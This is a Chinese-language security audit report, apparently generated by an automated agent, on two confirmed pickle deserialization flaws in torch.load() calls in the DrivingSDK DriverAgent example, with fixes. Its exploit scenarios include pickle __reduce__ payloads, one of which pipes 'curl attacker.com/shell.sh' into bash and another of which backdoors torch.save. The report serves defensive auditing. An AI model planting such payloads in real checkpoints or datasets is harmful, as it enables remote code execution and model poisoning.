# 漏洞扫描报告 — 已确认漏洞

**项目**: DrivingSDK
**扫描时间**: 2026-04-20T00:18:00Z
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

本次漏洞扫描针对 MindSeries SDK DrivingSDK 项目进行了全面的安全审计，重点关注 C/C++ 和 Python 混合代码库中的潜在安全风险。扫描共发现 **82 个候选漏洞**，经验证后确认 **2 个真实安全漏洞**，均为高危级别的 **pickle 反序列化漏洞 (CWE-502)**。

### 关键发现

**核心风险**: 项目中的 `model_examples/DriverAgent` 模块存在两处高危反序列化漏洞，攻击者可通过恶意 `.pt` 文件实现任意代码执行。这两处漏洞位于：

1. **train.py:112** - 模型 checkpoint 加载路径完全由命令行参数控制，无任何验证
2. **data.py:65** - 训练数据文件路径由外部参数传入，同样缺乏安全校验

### 业务影响

作为自动驾驶 SDK，此类漏洞具有严重的潜在危害：
- **训练环境污染**: 恶意代码可在模型训练过程中执行，导致模型被植入后门
- **供应链攻击**: 受污染的数据集或模型通过公开渠道分发后，可影响所有下游用户
- **知识产权泄露**: 训练数据和模型参数可能被窃取
- **自动驾驶安全风险**: 后门模型可能在特定场景下产生危险行为，影响轨迹预测准确性

### 建议的修复方向

**立即修复**: 对所有 `torch.load()` 调用添加 `weights_only=True` 参数，或改用安全的序列化格式（如 HDF5/NPZ）。对于无法使用 `weights_only=True` 的场景，应添加路径白名单验证和文件哈希校验。

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| POSSIBLE | 44 | 53.7% |
| FALSE_POSITIVE | 33 | 40.2% |
| LIKELY | 3 | 3.7% |
| CONFIRMED | 2 | 2.4% |
| **总计** | **82** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| High | 2 | 100.0% |
| **有效漏洞总计** | **2** | - |
| 误报 (FALSE_POSITIVE) | 33 | - |

### 1.3 Top 10 关键漏洞

1. **[VULN-SA-PY-001]** deserialization (High) - `model_examples/DriverAgent/train.py:112` @ `main` | 置信度: 85
2. **[VULN-SA-PY-002]** deserialization (High) - `model_examples/DriverAgent/data.py:65` @ `__init__` | 置信度: 85

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `with_imports@mx_driving/patcher/patch.py` | decorator | semi_trusted | eval() used for decorator expression resolution within patcher framework. Decorator expressions come from predefined patch definitions (developer-controlled), not user input. Risk is limited to developers creating custom patches with malicious decorator strings. | Decorator expression evaluation in patcher framework |
| `load_data@tests/torch/data_cache.py` | file | untrusted_local | torch.load() used without weights_only=True to load cached test data from file paths. File paths come from test cache directory (developer-controlled environment) but could be manipulated if cache directory is writable by other users. | Loading cached test data via torch.load() |
| `__init__@model_examples/DriverAgent/data.py` | file | untrusted_local | torch.load() used without weights_only=True to load .pt data files from user-provided path. Path is constructor argument, attacker can provide malicious .pt file if they control data source. | Loading training data from .pt files via torch.load() |
| `main@model_examples/DriverAgent/train.py` | file | untrusted_local | torch.load() used without weights_only=True to load pretrained model weights from args.continue_path. Path is CLI argument, attacker controlling command line can provide malicious checkpoint. | Loading model checkpoint via torch.load() |
| `__init__@mx_driving/get_chip_info.py` | env | semi_trusted | Loads libdrvdsmi_host.so from LD_LIBRARY_PATH. Library search path can be manipulated by local user via environment variable, but requires the attacker to place malicious library in accessible location. | Loading system library from LD_LIBRARY_PATH |
| `_set_env@mx_driving/__init__.py` | env | semi_trusted | Modifies ASCEND_CUSTOM_OPP_PATH environment variable, combining with existing value. Existing env value can be set by local user before importing mx_driving. | Modifying ASCEND_CUSTOM_OPP_PATH environment variable |
| `get_sha@setup.py` | env | trusted_admin | git rev-parse executed in project root directory during build. Command is hardcoded, cwd is BASE_DIR (project root). Only executed during pip install/build, attacker cannot trigger this at runtime. | Git command execution during build |

**其他攻击面**:
- Python API Input Validation: Tensor shape/type validation in ops modules (sparse_functional.py, voxelization.py)
- File Loading: torch.load() in model examples and test data cache (DriverAgent/data.py, data_cache.py)
- Environment Variable: LD_LIBRARY_PATH for library loading (get_chip_info.py), ASCEND_CUSTOM_OPP_PATH (__init__.py)
- Monkey Patching: Dynamic module replacement via patcher framework (patcher.py, patch.py)
- Decorator Evaluation: eval() in patch.py for decorator expression resolution
- C Extension Bindings: pybind.cpp exposes C++ operators to Python without validation
- Model Checkpoint Loading: torch.load() in DriverAgent/train.py for pretrained weights

---

## 3. High 漏洞 (2)

### [VULN-SA-PY-001] deserialization - main

**严重性**: High | **CWE**: CWE-502 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `model_examples/DriverAgent/train.py:112` @ `main`
**模块**: model_examples

**描述**: Unsafe deserialization via torch.load() without weights_only=True. The checkpoint path comes from CLI argument args.continue_path, which can be controlled by attacker to load a malicious .pt file containing arbitrary Python code execution through pickle deserialization.

**漏洞代码** (`model_examples/DriverAgent/train.py:112`)

```c
PiP.load_state_dict(torch.load(args.continue_path))
```

**达成路径**

args.continue_path [CLI argument] -> torch.load() -> PiP.load_state_dict()

**验证说明**: CLI argument args.continue_path directly controls torch.load() path. torch.load() uses pickle deserialization by default, enabling arbitrary code execution via malicious .pt file. No weights_only=True mitigation present. Entry point trust_level: untrusted_local confirms attacker can control file path.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

> 详细分析报告见: `details/VULN-SA-PY-001.md`

#### 根因分析

漏洞的根本原因在于 `torch.load()` 函数默认使用 Python 的 `pickle` 模块进行反序列化。pickle 在反序列化时会执行任意 Python 代码，这一设计特性在处理恶意文件时成为严重的安全漏洞。

**代码上下文** (`train.py:111-114`):

```python
if args.continue_path and os.path.exists(args.continue_path) and args.start_epoch is not None:
    PiP.load_state_dict(torch.load(args.continue_path))  # 漏洞点
    start_epoch = args.start_epoch
    logging.info(f"Resuming training from epoch {start_epoch}, loaded weights from {args.continue_path}")
```

关键问题：
- `os.path.exists()` 仅检查文件是否存在，**不验证文件内容**
- 命令行参数 `--continue_path` 完全由用户控制，无路径格式验证
- 未使用 `weights_only=True` 安全参数

#### 潜在利用场景

**攻击场景 1: 共享训练环境**
在多用户共享的 AI 训练服务器上，恶意用户可构造恶意 checkpoint 文件并诱导其他用户使用：

```bash
python train.py --continue_path /shared/malicious_checkpoint.tar --start_epoch 5
```

**攻击场景 2: 供应链攻击**
攻击者将恶意模型上传到公开模型仓库（如 Hugging Face），当用户下载并使用时触发漏洞：

```python
# 恶意 checkpoint 中的 payload
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))
```

**攻击场景 3: 组合攻击链**
与 VULN-SA-PY-002 配合使用，实现训练全过程的攻击覆盖：
- 数据加载阶段 (VULN-SA-PY-002) → 训练数据投毒
- 模型恢复阶段 (VULN-SA-PY-001) → 模型参数篡改

#### 建议的修复方式

**方案 1: 使用 weights_only=True (推荐)**

```python
PiP.load_state_dict(torch.load(args.continue_path, weights_only=True))
```

**方案 2: 路径白名单 + 哈希验证**

```python
SAFE_DIRS = ['./trained_models', '/opt/models']
checkpoint_path = os.path.abspath(args.continue_path)
if not any(checkpoint_path.startswith(d) for d in SAFE_DIRS):
    raise ValueError("Checkpoint path not in allowed directories")
# 添加哈希验证防止文件篡改
```

---

### [VULN-SA-PY-002] deserialization - __init__

**严重性**: High | **CWE**: CWE-502 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `model_examples/DriverAgent/data.py:65` @ `__init__`
**模块**: model_examples

**描述**: Unsafe deserialization via torch.load() without weights_only=True. The data file path comes from constructor argument, allowing attacker to provide a malicious .pt file that executes arbitrary code through pickle deserialization when loaded.

**漏洞代码** (`model_examples/DriverAgent/data.py:65`)

```c
loaded = torch.load(path)
```

**达成路径**

path [constructor argument] -> torch.load() -> loaded['traj']/loaded['tracks']

**验证说明**: Constructor argument 'path' directly controls torch.load() path. Same deserialization vulnerability as VULN-SA-PY-001. Entry point trust_level: untrusted_local confirms attacker can control file path through dataset configuration.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

> 详细分析报告见: `details/VULN-SA-PY-002.md`

#### 根因分析

与 VULN-SA-PY-001 同源，但攻击入口点不同。此漏洞位于数据集初始化阶段，路径来自 `train.py` 和 `evaluate.py` 的命令行参数 `--train_set`、`--val_set`、`--test_set`。

**代码上下文** (`data.py:52-68`):

```python
class highwayTrajDataset(Dataset):
    def __init__(self, path, t_h=30, t_f=50, d_s=2, ...):
        if not os.path.exists(path):
            raise RuntimeError("{} not exists!!".format(path))
        if path.endswith('.mat'):
            # 安全的 h5py 加载方式
        elif path.endswith('.pt'):
            loaded = torch.load(path)  # 漏洞点：不安全的反序列化
            self.Data = loaded['traj']
            self.Tracks = loaded['tracks']
```

关键问题：
- 文件扩展名检查仅过滤 `.pt`，**不验证内容**
- 无路径白名单，攻击者可指定任意路径
- 与 VULN-SA-PY-001 形成组合攻击链

#### 潜在利用场景

**攻击场景 1: 数据集供应链攻击**
恶意数据集通过公开平台分发，用户下载后触发：

```bash
# 攻击者构造恶意 .pt 数据文件
python train.py --train_set malicious_dataset.pt
```

**攻击场景 2: CI/CD 环境攻击**
攻击者替换 CI 环境中的数据集路径变量，污染构建产物：

```yaml
# 恶意 CI 配置
DATASET_PATH=/attacker/path/evil_data.pt
```

**攻击场景 3: 模型投毒**
通过恶意数据文件注入持久化后门，影响后续所有保存的模型：

```python
class ModelPoisonPayload:
    def __reduce__(self):
        return (exec, ('torch.save = lambda *args: print("[BACKDOOR]")',))
```

#### 与 VULN-SA-PY-001 的组合攻击

```
┌─────────────────────────────────────────────────────────────────┐
│                    组合攻击链                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VULN-SA-PY-002 (数据文件)                                      │
│  ├── train.py --train_set evil_data.pt                         │
│  ├── 训练阶段首次代码执行                                        │
│  └── 可植入持久化后门                                           │
│                          ↓                                      │
│  VULN-SA-PY-001 (模型文件)                                      │
│  ├── train.py --continue_path evil_model.tar                   │
│  ├── 继续训练时代码执行                                         │
│  └── 恢复训练阶段二次攻击                                       │
│                                                                 │
│  组合效果：训练全过程可被攻击者控制                               │
└─────────────────────────────────────────────────────────────────┘
```

#### 建议的修复方式

**方案 1: 改用安全的序列化格式 (推荐)**

由于数据文件包含复杂的数据结构（字典、numpy 数组），`weights_only=True` 不适用。建议改用 HDF5 或 NPZ 格式：

```python
import h5py
with h5py.File(path, 'r') as f:
    self.Data = np.array(f['traj']).transpose()
    self.Tracks = ...
```

**方案 2: 路径白名单 + 内容验证**

```python
ALLOWED_DATA_DIRS = ['/data/datasets', '/mnt/training_data']
abs_path = Path(path).resolve()
if not any(abs_path.is_relative_to(d) for d in ALLOWED_DATA_DIRS):
    raise RuntimeError("Path not in allowed directories")
# 验证数据结构完整性
if 'traj' not in loaded or 'tracks' not in loaded:
    raise RuntimeError("Invalid data structure")
```

---

## 4. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| model_examples | 0 | 2 | 0 | 0 | 2 |
| **合计** | **0** | **2** | **0** | **0** | **2** |

## 5. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-502 | 2 | 100.0% |

---

## 6. 修复建议

### 优先级 1: 立即修复 (Critical/High)

本次扫描发现的两个高危漏洞 (VULN-SA-PY-001 和 VULN-SA-PY-002) 需立即修复：

#### 6.1 torch.load() 安全加固

**问题代码位置**:
| 文件 | 行号 | 代码 | 修复方案 |
|------|------|------|----------|
| `model_examples/DriverAgent/train.py` | 112 | `torch.load(args.continue_path)` | 添加 `weights_only=True` |
| `model_examples/DriverAgent/data.py` | 65 | `torch.load(path)` | 改用 HDF5/NPZ 格式 |
| `model_examples/DriverAgent/evaluate.py` | 60 | `torch.load(...)` | 添加 `weights_only=True` |

**修复代码示例**:

```python
# train.py:112 修复
if args.continue_path and os.path.exists(args.continue_path) and args.start_epoch is not None:
    # 安全加载：仅加载权重数据，不允许任意 Python 对象
    PiP.load_state_dict(
        torch.load(args.continue_path, weights_only=True)
    )
    start_epoch = args.start_epoch
```

#### 6.2 数据文件安全加载

**推荐改用 HDF5 格式**:

```python
# data.py:52-68 修复
class highwayTrajDataset(Dataset):
    ALLOWED_DATA_DIRS = ['/data/datasets', '/mnt/training_data']
    
    def __init__(self, path, ...):
        # 路径白名单验证
        abs_path = Path(path).resolve()
        if not any(abs_path.is_relative_to(d) for d in self.ALLOWED_DATA_DIRS):
            raise RuntimeError(f"Path not in allowed directories: {path}")
        
        if path.endswith('.h5') or path.endswith('.hdf5'):
            with h5py.File(path, 'r') as f:
                self.Data = np.array(f['traj']).transpose()
                self.Tracks = ...
        elif path.endswith('.npz'):
            data = np.load(path, allow_pickle=False)
            self.Data = data['traj']
            self.Tracks = data['tracks'].tolist()
```

#### 6.3 路径验证增强

为所有文件加载路径添加安全验证：

```python
import hashlib
from pathlib import Path

def safe_load_checkpoint(model, checkpoint_path, expected_hash=None):
    """安全加载 checkpoint，包含多层验证"""
    # 1. 路径白名单
    safe_dirs = ['./trained_models', '/opt/models']
    checkpoint_path = os.path.abspath(checkpoint_path)
    
    if not any(checkpoint_path.startswith(os.path.abspath(d)) for d in safe_dirs):
        raise ValueError(f"Checkpoint path not in allowed directories")
    
    # 2. 扩展名验证
    if not checkpoint_path.endswith(('.tar', '.pt', '.pth', '.bin')):
        raise ValueError(f"Invalid checkpoint extension")
    
    # 3. 哈希验证（可选）
    if expected_hash:
        file_hash = hashlib.sha256(open(checkpoint_path, 'rb').read()).hexdigest()
        if file_hash != expected_hash:
            raise ValueError(f"Checkpoint hash mismatch!")
    
    # 4. 安全加载
    checkpoint = torch.load(checkpoint_path, weights_only=True)
    model.load_state_dict(checkpoint)
```

### 优先级 2: 短期修复 (Medium)

待确认报告中的 Medium 级别漏洞建议在短期内修复：

| 漏洞 ID | 类型 | 修复建议 |
|---------|------|----------|
| VULN-SA-PY-003 | 反序列化 | 添加 `weights_only=True` |
| scripts-003/004 | 路径遍历 | 添加环境变量验证 |
| mx_driving_csrc_library_injection_001 | 库注入 | 验证 `_init_op_api_so_path` 调用来源 |
| onnx_plugin_roi_align_negative_value_conversion | 整数溢出 | 添加参数范围验证 |

### 优先级 3: 计划修复 (Low)

大部分 Low 级别漏洞属于库 API 输入验证的质量缺陷，建议作为代码质量改进计划处理：

| 类型 | 数量 | 修复方向 |
|------|------|----------|
| Missing Input Validation | 20+ | 在 Python API 层添加 tensor shape/dtype/value 验证 |
| Integer Overflow | 5 | 添加整数溢出检查，使用 `size_t` 替代 `int32_t` |
| env_variable_injection | 2 | 环境变量使用前添加验证 |

---

## 7. 修复验证测试

建议编写以下安全测试验证修复效果：

```python
import unittest
import tempfile
import os
import torch

class TestCheckpointLoadingSecurity(unittest.TestCase):
    def test_malicious_checkpoint_rejection(self):
        """测试恶意 checkpoint 被拒绝"""
        class MaliciousPayload:
            def __reduce__(self):
                return (os.system, ('echo pwned',))
        
        malicious_checkpoint = {
            'weight': torch.randn(10, 10),
            '__payload__': MaliciousPayload()
        }
        
        with tempfile.NamedTemporaryFile(suffix='.tar') as f:
            torch.save(malicious_checkpoint, f.name)
            # weights_only=True 应拒绝恶意 checkpoint
            try:
                checkpoint = torch.load(f.name, weights_only=True)
                self.fail("Malicious checkpoint was loaded!")
            except Exception:
                pass  # 预期行为
```

---

## 附录: 相关 CVE 参考

| CVE | 描述 | 关联漏洞 |
|-----|------|----------|
| CVE-2023-33975 | PyTorch torch.load() RCE vulnerability | VULN-SA-PY-001/002 |
| CVE-2022-45907 | PyTorch insecure deserialization | VULN-SA-PY-001/002 |
| CVE-2023-36984 | PyTorch remote code execution via torch.load | VULN-SA-PY-001/002 |

---

**报告生成时间**: 2026-04-20
**报告生成工具**: Reporter Agent (@reporter)
**详细分析报告**: `details/VULN-SA-PY-001.md`, `details/VULN-SA-PY-002.md`
